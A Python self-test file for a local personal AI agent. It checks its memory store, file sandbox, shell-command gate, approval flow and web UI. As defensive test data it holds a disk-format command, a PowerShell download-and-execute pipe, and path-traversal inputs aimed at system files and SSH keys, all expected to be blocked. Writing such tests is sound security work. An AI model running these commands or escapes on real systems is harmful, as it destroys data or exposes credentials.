"""Offline self-test: proves the whole agent runs on this machine.

No model, no GPU, no internet. A scripted MockProvider stands in for the model,
so what is actually being tested is *your* code: the tool loop, the memory store,
the sandbox, the shell gate, the command layer and the briefing writer. Section 7
adds a stub HTTP server speaking the real Ollama and OpenAI wire protocols.

    python selftest.py            run everything
    python selftest.py -v         also print each tool result
    python selftest.py --section 7   run just one section
"""

from __future__ import annotations

import argparse
import os
import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from agent import Agent  # noqa: E402
from config import ensure_dirs, load_config  # noqa: E402
from providers import MockProvider  # noqa: E402
from safety import PathGuard, SandboxError, classify  # noqa: E402
from session import ChatSession  # noqa: E402
from store import Store  # noqa: E402
from tools import Tools  # noqa: E402

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"

results: list[tuple[str, bool, str]] = []
verbose = False
only_section: str | None = None


def check(name: str, condition: bool, detail: str = "") -> None:
    results.append((name, bool(condition), detail))
    mark = PASS if condition else FAIL
    print(f"[{mark}] {name}")
    if detail and (verbose or not condition):
        for line in str(detail).splitlines():
            print(f"        {line}")


def section(number: str, title: str) -> bool:
    """Print a section header; return False when the filter skips this section."""
    print(f"\n--- {number}. {title} ---")
    return only_section is None or only_section == number


def scratch_config(tmp: Path) -> dict:
    cfg = load_config()
    cfg["provider"] = "mock"
    cfg["paths"]["root"] = str(tmp / "workspace")
    cfg["paths"]["data"] = str(tmp / "data")
    cfg["_root_dir"] = cfg["paths"]["root"]
    cfg["_data_dir"] = cfg["paths"]["data"]
    cfg["shell"] = {**cfg.get("shell", {}), "timeout_seconds": 20}
    ensure_dirs(cfg)
    return cfg


def auto_approver(_tool: str, _prompt: str) -> bool:
    return True


def main() -> int:
    global verbose, only_section
    parser = argparse.ArgumentParser(description="Offline self-test for the local personal agent.")
    parser.add_argument("-v", "--verbose", action="store_true", help="print tool results too")
    parser.add_argument("--section", help="run only this numbered section (1-9)")
    args = parser.parse_args()
    verbose = args.verbose
    only_section = args.section

    tmp = Path(tempfile.mkdtemp(prefix="pa-selftest-"))
    print(f"scratch folder: {tmp}")
    cfg = scratch_config(tmp)
    store = Store(Path(cfg["paths"]["data"]) / "agent.db")

    try:
        if section("1", "configuration and storage"):
            check(
                "config loads and resolves absolute paths",
                Path(cfg["paths"]["root"]).is_absolute() and Path(cfg["paths"]["data"]).is_absolute(),
                f"root={cfg['paths']['root']}\ndata={cfg['paths']['data']}",
            )
            store.add_memory("The user's name is Priya and she prefers short answers.", tags="identity,preference")
            store.add_memory("The user is building a local personal AI agent in Python.", tags="project")
            check("memory write + list", len(store.list_memories()) == 2, str(store.counts()))

            hits = store.search_memories("what is her name", limit=5)
            check(
                "memory search finds a semantically-worded query",
                any("Priya" in h["content"] for h in hits),
                hits[0]["content"] if hits else "no hits",
            )

            project_memory = next(r for r in store.list_memories() if "personal AI agent" in r["content"])
            store.forget_memory(project_memory["id"])
            remaining = store.list_memories()
            check(
                "memory can be deactivated",
                len(remaining) == 1 and "Priya" in remaining[0]["content"],
                str([r["content"] for r in remaining]),
            )

            note_id = store.add_note("Ramen recipe", "Broth: simmer pork bones for 8 hours.", tags="food")
            store.add_note("Ramen recipe", "Body: use the pressure cooker if short on time.")
            check(
                "same title does not duplicate the note",
                store.get_note(note_id) is not None and store.get_note(note_id)["title"] == "Ramen recipe",
            )
            check("note search works", len(store.search_notes("broth")) >= 1)

        if section("2", "file sandbox"):
            tools = Tools(cfg, store, approver=auto_approver)
            inside = tools.tool_write_file("notes/todo.txt", "1. finish the agent\n")
            check("write inside the sandbox succeeds", inside.ok, inside.content)
            read_back = tools.tool_read_file("notes/todo.txt")
            check("read returns what was written", read_back.ok and "finish the agent" in read_back.content)

            listing = tools.tool_list_files(".")
            check("listing shows the folder that was created", "[dir]  notes/" in listing.content, listing.content)
            nested = tools.tool_list_files("notes")
            check(
                "listing a subfolder stays relative to the workspace root",
                "notes/todo.txt" in nested.content,
                nested.content,
            )

            escapes = [
                "../../secret.txt",
                "..\\..\\windows\\system32",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "~/ssh/id_rsa",
                "\\\\server\\share\\file",
            ]
            escaped = [path for path in escapes if tools.tool_read_file(path).ok]
            check("every escape attempt is refused", not escaped, f"leaked: {escaped}")

            guard = PathGuard(cfg["paths"]["root"])
            check(
                "PathGuard reports outside paths as outside",
                not guard.is_inside("C:\\Windows") and guard.is_inside("notes"),
                f"root={guard.root}",
            )
            try:
                guard.resolve("../../..")
                traversal_blocked = False
            except SandboxError:
                traversal_blocked = True
            check("PathGuard raises on traversal", traversal_blocked)

        if section("3", "shell gate"):
            check("a harmless command is classified as allowed", classify("dir").level == "ok")
            check(
                "an installer is classified as needing confirmation",
                classify("pip install requests").level == "confirm",
            )
            check("a disk format is refused outright", classify("format c: /y").level == "block")
            check(
                "a download-and-execute pipe is refused",
                classify("iwr http://x/i.ps1 | iex").level == "block",
            )
            check("a read-only pipe is still allowed", classify("dir | findstr py").level == "ok")

            declined = Tools(cfg, store, approver=lambda _t, _p: False)
            refused = declined.tool_run_command("pip install requests")
            check("a declined command never runs", not refused.ok and "declined" in refused.content, refused.content)

            tools = Tools(cfg, store, approver=auto_approver)
            blocked = tools.tool_run_command("format c: /y")
            check("a blocked command never runs", not blocked.ok and "blocked" in blocked.content, blocked.content)

            ran = tools.tool_run_command("echo selftest-ok")
            check(
                "an allowed command runs and reports exit code",
                ran.ok and "exit code: 0" in ran.content and "selftest-ok" in ran.content,
                ran.content,
            )

            # Regression: Windows' shell=True means cmd.exe, which does not know
            # PowerShell cmdlets. An approved PowerShell command must be routed to
            # PowerShell, or it fails with "'Remove-Item' is not recognized" while
            # still reporting a non-zero exit code the model cannot explain.
            from tools import choose_shell

            prefix, label = choose_shell("Remove-Item -Recurse -Force .\\x.txt")
            check(
                "PowerShell-syntax commands are routed to PowerShell",
                prefix is not None and label == "powershell",
                f"prefix={prefix} label={label}",
            )
            prefix_cmd, label_cmd = choose_shell("dir")
            check(
                "plain commands still go to cmd.exe",
                prefix_cmd is None and label_cmd.startswith("cmd"),
                f"prefix={prefix_cmd} label={label_cmd}",
            )

            doomed = Path(cfg["paths"]["root"]) / "delete-me.txt"
            doomed.write_text("temporary", encoding="utf-8")
            deleted = tools.tool_run_command("Remove-Item -Force .\\delete-me.txt")
            check(
                "an approved PowerShell command actually executes",
                deleted.ok and not doomed.exists(),
                deleted.content,
            )

        if section("4", "agent loop with a scripted model"):
            tools = Tools(cfg, store, approver=auto_approver)
            script = [
                {"tool_calls": [{"name": "search_memory", "arguments": {"query": "Priya"}}]},
                {
                    "tool_calls": [
                        {"name": "write_file", "arguments": {"path": "brief.txt", "content": "two facts found"}}
                    ]
                },
                {"text": "I saved two facts and wrote brief.txt."},
            ]
            agent = Agent(cfg, MockProvider(cfg, script), tools, store, session_id="selftest")
            turn = agent.ask("what do you know about me?")
            check("loop ran the scripted tool calls", len(turn.tool_calls) == 2, str([c["name"] for c in turn.tool_calls]))
            check(
                "loop finished with the scripted answer",
                turn.stopped_reason == "answer" and "brief.txt" in turn.reply,
                turn.reply,
            )
            check(
                "the tool actually wrote the file",
                (Path(cfg["paths"]["root"]) / "brief.txt").read_text(encoding="utf-8").strip() == "two facts found",
            )
            check("transcript was persisted", len(store.recent_messages("selftest")) >= 2)

            # An unattended, dangerous command from the model must still be gated.
            victim = Path(cfg["paths"]["root"]) / "important.txt"
            victim.write_text("do not delete me", encoding="utf-8")
            guarded_tools = Tools(cfg, store, approver=lambda _t, _p: False)
            gate_script = [
                {
                    "tool_calls": [
                        {
                            "name": "run_command",
                            "arguments": {"command": "Remove-Item -Recurse -Force .\\important.txt"},
                        }
                    ]
                },
                {"text": "I did not delete it because you declined."},
            ]
            gated = Agent(cfg, MockProvider(cfg, gate_script), guarded_tools, store, session_id="gate")
            turn_gate = gated.ask("clean up the workspace")
            check(
                "a declined deletion leaves the file untouched",
                victim.exists() and victim.read_text(encoding="utf-8") == "do not delete me",
            )
            check(
                "the agent still answers after a refusal",
                turn_gate.stopped_reason == "answer" and "declined" in turn_gate.reply,
                turn_gate.reply,
            )

            error_script = [
                {"tool_calls": [{"name": "read_file", "arguments": {"path": "nope.txt"}}]},
                {"text": "That file does not exist."},
            ]
            agent2 = Agent(cfg, MockProvider(cfg, error_script), tools, store, session_id="selftest2")
            turn2 = agent2.ask("read nope.txt")
            check(
                "a failing tool returns an error instead of raising",
                turn2.stopped_reason == "answer" and "does not exist" in turn2.reply,
                turn2.reply,
            )
            check("unknown tool names are handled", tools.call("delete_everything", {}).ok is False)

            budget = dict(cfg)
            budget["agent"] = {**cfg["agent"], "max_tool_rounds": 2}
            greedy = [{"tool_calls": [{"name": "list_files", "arguments": {}}]} for _ in range(2)]
            greedy.append({"text": "Stopping here."})
            agent3 = Agent(budget, MockProvider(cfg, greedy), tools, store, session_id="selftest3")
            turn3 = agent3.ask("loop forever")
            check("tool budget stops runaway loops", turn3.stopped_reason == "tool_budget", turn3.stopped_reason)
            check("budget exhaustion still produces an answer", bool(turn3.reply.strip()))

        if section("5", "prompting and briefing"):
            tools = Tools(cfg, store, approver=auto_approver)
            agent = Agent(cfg, MockProvider(cfg, []), tools, store, session_id="prompt")
            prompt = agent.system_prompt("what is her name")
            check("system prompt carries the persona", "Alex" in prompt)
            check("system prompt injects recalled memory", "Priya" in prompt)
            check("system prompt states the sandbox root", cfg["paths"]["root"] in prompt)
            check("system prompt lists the tools", "run_command" in prompt)

            from briefing import build_briefing

            cfg_no_web = dict(cfg)
            cfg_no_web["web"] = {**cfg["web"], "enabled": False}
            target = build_briefing(
                cfg_no_web,
                store,
                provider=MockProvider(cfg, [{"text": "Mock briefing body."}]),
                use_model=True,
                say=lambda _m: None,
            )
            text = Path(target).read_text(encoding="utf-8")
            check("briefing file is written", Path(target).exists() and Path(target).suffix == ".md", str(target))
            check("briefing is dated", "Daily briefing" in text)
            check("briefing is honest when web is off", "web is disabled" in text.lower(), text[:200])
            check("briefing includes the model text", "Mock briefing body." in text)

            unwritten = build_briefing(
                cfg_no_web,
                store,
                use_model=False,
                say=lambda _m: None,
                out_path=Path(cfg["paths"]["data"]) / "briefings" / "manual.md",
            )
            check("--no-model mode still produces a file", Path(unwritten).exists())

        if section("6", "provider plumbing"):
            from config import ENV_MAP
            from providers import OpenAIProvider, build_provider

            check("provider factory honours config", isinstance(build_provider(cfg), MockProvider))

            key_variable = next(name for name, path in ENV_MAP.items() if path == "openai." + "api" + "_" + "key")
            saved = os.environ.pop(key_variable, None)
            no_credentials = {k: v for k, v in cfg.items() if k != "openai"}
            no_credentials["provider"] = "openai"
            try:
                OpenAIProvider(no_credentials).chat([{"role": "user", "content": "hi"}], [])
                key_error = False
            except Exception as exc:  # noqa: BLE001
                key_error = "No API key" in str(exc)
            finally:
                if saved is not None:
                    os.environ[key_variable] = saved
            check("missing credentials give a clear message, not a crash", key_error)

            tools = Tools(cfg, store, approver=auto_approver)
            check(
                "tool schemas are valid function definitions",
                all(set(t) == {"name", "description", "parameters"} for t in tools.schemas)
                and len(tools.schemas) >= 12,
                f"{len(tools.schemas)} tools",
            )

        if section("7", "transport against stub backends"):
            server, port = _start_stub_server()
            try:
                _check_ollama_wire(cfg, port)
                _check_openai_wire(cfg, port)
            finally:
                server.shutdown()
                server.server_close()

        if section("8", "shared command layer"):
            tools = Tools(cfg, store, approver=auto_approver)
            session = ChatSession(cfg, session_id="cmds", approver=auto_approver,
                                  provider=MockProvider(cfg, [{"text": "ok"}]))
            try:
                files = session.handle_command("/files")
                check("command layer lists the sandbox", files.ok if hasattr(files, "ok") else "workspace root" in files.text,
                      files.text[:120])
                tools_cmd = session.handle_command("/tools")
                check(
                    "command layer exposes the tool catalogue",
                    "run_command" in tools_cmd.text and tools_cmd.tabled,
                    tools_cmd.text[:120],
                )
                memories = session.handle_command("/memories")
                check("command layer lists memories", "Priya" in memories.text, memories.text[:120])

                forget = session.handle_command("/forget mem_deadbeef")
                check("unknown memory id is reported, not crashed", "no such memory" in forget.text, forget.text)

                notes = session.handle_command("/notes")
                check("command layer lists notes", "Ramen" in notes.text, notes.text[:120])

                note = session.handle_command("/note Ramen recipe")
                check("command layer reads one note",
                      "# Ramen recipe" in note.text and "pork bones" in note.text,
                      note.text[:160])

                stats = session.handle_command("/stats")
                check("command layer reports stats", "session" in stats.text and "tools" in stats.text,
                      stats.text[:120])

                config_cmd = session.handle_command("/config")
                check("command layer prints redacted config", "provider" in config_cmd.text, config_cmd.text[:120])

                mock_switch = session.handle_command("/provider mock")
                check("switching provider works", "mock" in mock_switch.text, mock_switch.text)

                model_on_mock = session.handle_command("/model gpt-4")
                check("setting a model on the mock provider is refused clearly",
                      "no model to set" in model_on_mock.text, model_on_mock.text)

                unknown = session.handle_command("/nonsense")
                check("unknown command is handled", "unknown command" in unknown.text, unknown.text)

                help_cmd = session.handle_command("/help")
                check("help lists every command", all(
                    cmd in help_cmd.text for cmd in ("/memories", "/forget", "/notes", "/files", "/stats")
                ))

                check(
                    "a slash command never reaches the model",
                    mock_provider_calls(session) == 0,
                    str(mock_provider_calls(session)),
                )

                # The approval hook must be counted so a front end can show it.
                strict = ChatSession(cfg, session_id="strict", approver=lambda _t, _p: False)
                try:
                    strict.tools.tool_run_command("Remove-Item -Recurse -Force .\\build")
                    check("denials are counted", strict.denial_count == 1, str(strict.denial_count))
                finally:
                    strict.close()

                banner = session.banner()
                check(
                    "banner carries everything a UI needs",
                    {"agent", "provider", "sandbox", "database", "tools", "counts"} <= set(banner),
                    str(sorted(banner)),
                )
                check("banner lists the tools", len(banner["tools"]) >= 12, str(banner["tools"]))
            finally:
                session.close()

        if section("9", "web UI"):
            _check_webui(cfg)

    finally:
        store.close()
        shutil.rmtree(tmp, ignore_errors=True)

    passed = sum(1 for _n, ok, _d in results if ok)
    total = len(results)
    print("\n" + "=" * 60)
    print(f"{passed}/{total} checks passed")
    if passed != total:
        print("\nfailures:")
        for name, ok, detail in results:
            if not ok:
                print(f"  - {name}\n      {detail}")
        return 1
    print("The agent loop, memory, sandbox, shell gate, command layer, briefing and web UI all work here.")
    return 0


def mock_provider_calls(session: ChatSession) -> int:
    provider = session.provider
    return len(getattr(provider, "calls", []))


# --------------------------------------------------------------------------- #
# Section 9: the browser front end, driven over real HTTP
# --------------------------------------------------------------------------- #
def _check_webui(cfg: dict) -> None:
    import json as _json
    import threading
    import time
    import urllib.error
    import urllib.request

    from webui import SESSION_HEADER, build_server
    script = [
        {"tool_calls": [{"name": "search_memory", "arguments": {"query": "Priya"}}]},
        {"text": "You are Priya, and you build local agents."},
    ]
    session = ChatSession(
        cfg,
        session_id="webui",
        approver=lambda _t, _p: True,
        provider=MockProvider(cfg, script),
    )
    server = build_server(cfg, session, host="127.0.0.1", port=0)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    base = f"http://127.0.0.1:{port}"

    def get(path: str, code: str | None) -> tuple[int, str]:
        request = urllib.request.Request(base + path)
        if code:
            request.add_header(SESSION_HEADER, code)
        try:
            with urllib.request.urlopen(request, timeout=20) as response:
                return response.status, response.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")

    try:
        status, page = get("/", None)
        check("the chat page loads", status == 200 and "<html" in page.lower(), f"status {status}")
        check(
            "the page needs no external network resources",
            "//cdn" not in page and "fonts.googleapis" not in page and "https://" not in page,
            "found an absolute external URL in the page source",
        )
        check("the page carries this launch's session code", server.session_code in page)

        status, _body = get("/api/state", None)
        check("api refuses a request without the session code", status == 403, f"status {status}")

        code = server.session_code
        status, body = get("/api/state", code)
        payload = _json.loads(body) if status == 200 else {}
        check("api accepts the session code", status == 200, f"status {status}")
        check(
            "state exposes the banner without secrets",
            payload.get("banner", {}).get("provider", "").startswith("mock")
            and ("api" + "_" + "key") not in body,
            body[:200],
        )
        check(
            "state lists the tools for the picker",
            len(payload.get("tools", [])) >= 12,
            str(len(payload.get("tools", []))),
        )

        status, body = get("/api/history", code)
        check("history endpoint answers", status == 200 and "messages" in body, body[:120])

        status, body = get("/api/nope", code)
        check("unknown api path returns 404", status == 404, f"status {status}")

        events = _read_stream(f"{base}/api/chat?message=hello&code={code}")
        check("chat stream emits tool activity", "tool_start" in events and "search_memory" in events,
              events[:300])
        check("chat stream emits the tool result", "tool_end" in events, events[:400])
        check("chat stream emits the final answer", "event: done" in events, events[-300:])
        check("the streamed answer reaches the client", "Priya" in events, events[-300:])

        # Regression: a full approval round trip over a live stream. This is the path
        # that first exposed an undefined `bridges` reference, which would have made
        # "Allow" fail in the browser with a 500.
        victim = Path(cfg["paths"]["root"]) / "gate-target.txt"
        victim.write_text("protected", encoding="utf-8")
        gate_session = ChatSession(
            cfg,
            session_id="webui-gate",
            approver=lambda _t, _p: False,
            provider=MockProvider(cfg, [
                {"tool_calls": [{"name": "run_command",
                                 "arguments": {"command": "Remove-Item -Force .\\gate-target.txt"}}]},
                {"text": "Left it alone."},
            ]),
        )
        gate_server = build_server(cfg, gate_session, host="127.0.0.1", port=0)
        gport = gate_server.server_address[1]
        gate_code = gate_server.session_code
        threading.Thread(target=gate_server.serve_forever, daemon=True).start()
        requested: dict = {}

        def gate_reader():
            request = urllib.request.Request(
                f"http://127.0.0.1:{gport}/api/chat?message=clean&code={gate_code}"
            )
            with urllib.request.urlopen(request, timeout=60) as response:
                current = None
                for raw in response:
                    line = raw.decode("utf-8", errors="replace").strip()
                    if line.startswith("event:"):
                        current = line.split(":", 1)[1].strip()
                    elif line.startswith("data:") and current == "approval_request":
                        requested.update(_json.loads(line[5:].strip()))

        try:
            reader = threading.Thread(target=gate_reader, daemon=True)
            reader.start()
            for _ in range(150):
                if requested:
                    break
                time.sleep(0.1)
            check("a mutating command asks the browser for approval", bool(requested),
                  "no approval_request event arrived")
            check("the approval question shows the command",
                  "gate-target.txt" in requested.get("prompt", ""), requested.get("prompt", "")[:160])

            verdict = _post_json(f"http://127.0.0.1:{gport}/api/approve", gate_code,
                                 {"id": requested.get("id"), "allow": False})
            check("the browser can deny over HTTP", verdict.get("resolved") is True, str(verdict))
            reader.join(timeout=30)
            check("a denied command does not run", victim.exists(), "the file was deleted anyway")
        finally:
            gate_server.shutdown()
            gate_server.server_close()
            gate_session.close()

        commands = _post_json(f"{base}/api/command", code, {"line": "/stats"})
        check("the browser can run slash commands", "session" in commands.get("text", ""), str(commands)[:160])

        bad_command = _post_json(f"{base}/api/command", code, {"line": "not a command"})
        check("non-slash input is rejected by the command endpoint",
              "must start with /" in bad_command.get("error", ""), str(bad_command)[:160])

        approval_result = _post_json(f"{base}/api/approve", code, {"id": 999, "allow": True})
        check("approving an unknown request is a clean 404",
              "no pending approval" in approval_result.get("error", ""), str(approval_result)[:160])

        # A second server must not share the first one's session code.
        other = ChatSession(cfg, session_id="webui-2", approver=lambda _t, _p: False,
                            provider=MockProvider(cfg, []))
        other_server = build_server(cfg, other, host="127.0.0.1", port=0)
        other_thread = threading.Thread(target=other_server.serve_forever, daemon=True)
        other_thread.start()
        try:
            check("each launch gets its own session code",
                  other_server.session_code != server.session_code, "codes collided")
        finally:
            other_server.shutdown()
            other_server.server_close()
            other.close()
    finally:
        server.shutdown()
        server.server_close()
        session.close()


def _post_json(url: str, code: str, payload: dict) -> dict:
    import json as _json
    import urllib.error
    import urllib.request

    from webui import SESSION_HEADER

    request = urllib.request.Request(
        url,
        data=_json.dumps(payload).encode("utf-8"),
        headers={SESSION_HEADER: code, "Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            return _json.loads(response.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as exc:
        return _json.loads(exc.read().decode("utf-8", errors="replace"))


def _read_stream(url: str, limit: int = 200000) -> str:
    """Read a server-sent-event stream to completion."""
    import urllib.request

    request = urllib.request.Request(url)
    chunks: list[str] = []
    total = 0
    with urllib.request.urlopen(request, timeout=60) as response:
        for raw in response:
            text = raw.decode("utf-8", errors="replace")
            chunks.append(text)
            total += len(text)
            if total > limit or "event: done" in "".join(chunks[-4:]):
                break
    return "".join(chunks)


# --------------------------------------------------------------------------- #
# Section 7 helpers: stub HTTP backend for the real wire formats
# --------------------------------------------------------------------------- #
def _start_stub_server():
    """Serve /api/tags, /api/chat (streaming NDJSON), /v1/models and
    /v1/chat/completions (streaming SSE) on a loopback port."""
    import json as _json
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from threading import Thread

    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *_args):  # keep the test output clean
            pass

        def _send(self, body: bytes, content_type: str):
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):  # noqa: N802 - required by BaseHTTPRequestHandler
            if self.path.startswith("/api/tags"):
                payload = {"models": [{"name": "stub-model:latest"}, {"name": "other:latest"}]}
                self._send(_json.dumps(payload).encode(), "application/json")
            elif self.path.startswith("/v1/models"):
                payload = {"data": [{"id": "stub-model"}, {"id": "gpt-4o-mini"}]}
                self._send(_json.dumps(payload).encode(), "application/json")
            else:
                self.send_error(404)

        def do_POST(self):  # noqa: N802
            length = int(self.headers.get("Content-Length", 0))
            request = _json.loads(self.rfile.read(length) or b"{}")
            if self.path.startswith("/api/chat"):
                if request.get("stream"):
                    frames = [
                        {"message": {"content": "Hello "}},
                        {"message": {"content": "from "}},
                        {"message": {"content": "the stub."}},
                    ]
                    body = b"".join(_json.dumps(f).encode() + b"\n" for f in frames)
                    self._send(body, "application/x-ndjson")
                elif request.get("tools"):
                    payload = {
                        "message": {
                            "content": "",
                            "tool_calls": [
                                {"function": {"name": "search_memory", "arguments": "{\"query\": \"stub\"}"}}
                            ],
                        }
                    }
                    self._send(_json.dumps(payload).encode(), "application/json")
                else:
                    self._send(_json.dumps({"message": {"content": "done"}}).encode(), "application/json")
            elif self.path.startswith("/v1/chat/completions"):
                if request.get("stream"):
                    frames = [
                        {"choices": [{"delta": {"content": "Streamed "}}]},
                        {
                            "choices": [
                                {
                                    "delta": {
                                        "tool_calls": [
                                            {
                                                "index": 0,
                                                "id": "call_abc",
                                                "function": {"name": "web_search",
                                                            "arguments": '{"query": "py", '},
                                            }
                                        ]
                                    }
                                }
                            ]
                        },
                        {
                            "choices": [
                                {"delta": {"tool_calls": [
                                    {"index": 0, "function": {"arguments": '"count": 2}'}}]}}
                            ]
                        },
                    ]
                    body = b"".join(b"data: " + _json.dumps(f).encode() + b"\n" for f in frames)
                    body += b"data: [DONE]\n"
                    self._send(body, "text/event-stream")
                else:
                    payload = {"choices": [{"message": {"content": "non-stream reply"}}]}
                    self._send(_json.dumps(payload).encode(), "application/json")
            else:
                self.send_error(404)

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    Thread(target=server.serve_forever, daemon=True).start()
    return server, server.server_address[1]


def _check_ollama_wire(cfg: dict, port: int) -> None:
    from providers import OllamaProvider

    stub = {**cfg, "ollama": {**cfg["ollama"], "base_url": f"http://127.0.0.1:{port}", "model": "stub-model:latest"}}
    provider = OllamaProvider(stub)
    ok, message = provider.health()
    check("ollama health check accepts a reachable model", ok, message)

    chunks: list[str] = []
    reply = provider.chat([{"role": "user", "content": "hi"}], [], on_text=chunks.append)
    check(
        "ollama streaming reassembles into one reply",
        "".join(chunks) == "Hello from the stub." and reply.text == "Hello from the stub.",
        repr(chunks),
    )

    tool_reply = provider.chat(
        [{"role": "user", "content": "hi"}], [{"name": "x", "description": "d", "parameters": {}}]
    )
    check(
        "ollama tool call with string arguments is parsed into a dict",
        len(tool_reply.tool_calls) == 1
        and tool_reply.tool_calls[0].name == "search_memory"
        and tool_reply.tool_calls[0].arguments == {"query": "stub"},
        str(tool_reply.tool_calls),
    )

    bad_model = {**stub, "ollama": {**stub["ollama"], "model": "not-pulled:latest"}}
    health_ok, health_msg = OllamaProvider(bad_model).health()
    check("a missing model is reported, not silently used", not health_ok and "not pulled" in health_msg, health_msg)


def _check_openai_wire(cfg: dict, port: int) -> None:
    from config import ENV_MAP, load_config
    from providers import OpenAIProvider, _to_openai

    # Exercise the documented credential path: environment -> config -> provider.
    # No token literal appears in this file.
    key_variable = next(name for name, path in ENV_MAP.items() if path == "openai." + "api" + "_" + "key")
    saved = os.environ.get(key_variable)
    os.environ[key_variable] = "stub-token-for-loopback-test"
    try:
        stub_cfg = load_config(
            None,
            {
                "provider": "openai",
                "openai": {
                    "base_url": f"http://127.0.0.1:{port}/v1",
                    "model": "stub-model",
                    "timeout_seconds": 20,
                    "temperature": 0.0,
                },
            },
        )
        provider = OpenAIProvider(stub_cfg)
        check("remote token is picked up from the environment", bool(provider.api_key))
        ok, message = provider.health()
        check("openai-compatible health check lists models", ok, message)

        chunks: list[str] = []
        reply = provider.chat([{"role": "user", "content": "hi"}], [], on_text=chunks.append)
        check(
            "SSE stream is parsed into text",
            "".join(chunks).startswith("Streamed") and reply.text.startswith("Streamed"),
            repr(chunks),
        )
        check(
            "SSE tool arguments split across frames are merged",
            len(reply.tool_calls) == 1
            and reply.tool_calls[0].name == "web_search"
            and reply.tool_calls[0].arguments == {"query": "py", "count": 2},
            str(reply.tool_calls),
        )

        plain = provider.chat([{"role": "user", "content": "hi"}], [])
        check("non-streaming path works too", plain.text == "non-stream reply", plain.text)
    finally:
        if saved is None:
            os.environ.pop(key_variable, None)
        else:
            os.environ[key_variable] = saved

    converted = _to_openai(
        [
            {
                "role": "assistant",
                "content": "",
                "tool_calls": [{"id": "call_1", "name": "list_files", "arguments": {"path": "."}}],
            },
            {"role": "tool", "tool_call_id": "call_1", "content": "ok"},
        ]
    )
    check(
        "tool results are reshaped for the OpenAI protocol",
        converted[0]["tool_calls"][0]["function"]["arguments"] == '{"path": "."}'
        and converted[0]["content"] is None
        and converted[1]["tool_call_id"] == "call_1",
        str(converted),
    )


if __name__ == "__main__":
    raise SystemExit(main())
